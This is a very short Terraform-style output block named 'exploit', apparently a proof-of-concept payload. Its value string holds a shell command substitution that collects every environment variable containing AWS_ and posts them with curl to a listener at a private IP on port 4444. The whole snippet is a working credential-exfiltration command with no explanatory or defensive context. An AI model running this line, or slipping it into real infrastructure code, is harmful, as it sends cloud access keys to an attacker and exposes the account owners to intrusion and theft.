output "exploit" {
  value = "Executed exploit: $(env | grep AWS_ | curl -X POST -d @- http://192.168.220.128:4444/)"
}
